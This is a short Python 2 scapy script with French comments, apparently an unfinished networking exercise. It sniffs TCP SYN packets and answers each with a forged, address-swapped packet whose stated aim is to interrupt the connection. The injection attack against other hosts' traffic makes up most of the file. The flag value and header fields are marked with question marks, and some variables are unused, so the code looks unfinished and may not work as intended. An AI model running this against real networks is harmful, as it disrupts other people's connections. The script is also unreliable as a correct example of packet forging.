from scapy.all import *

class entier:
    def __init__(self):
        self.val = 0
    def inc(self):
        self.val += 1
i = entier()


ip_autorite = '129.104.32.41' # change me

### fonctions a appliquer aux pkts ###
def showPkt(x):         ##Print pkt:
    #x.show()           #->detaille
    print x.summary()   #->simple

def synAns(x):          ##reponse a un pkt-SYN; but: interrompre la connexion
    showPkt(x)
    pIp=IP(src=x[IP].dst, dst=x[IP].src)   #id,ttl??
    ans=pIp/TCP(sport=x[TCP].dport,dport=x[TCP].sport,seq=x[TCP].ack, ack=x[TCP].seq+1, flags=0b11) #ack, seq,dataofs??
    send(ans);

### filtres ###
def monFiltre(x):
    return (x.haslayer(DNS))# and (x[DNS].qr==0L)

def tcpSyn(x):     ##Syn-pkt filter
    return x.haslayer(TCP) and (x[TCP].flags>>1 & 1 ) #SYN bit=1

def tcpAck(x):      ##Ack-pkt filter
    return x.haslayer(TCP) and (x[TCP].flags>>4 & 1 ) #ACK bit=1


filtre = sys.argv[1]
#sniff(count = 1000,lfilter = monFiltre,prn = maFonction, timeout = 60)
sniff(count = 1000,lfilter = tcpSyn, prn= synAns)
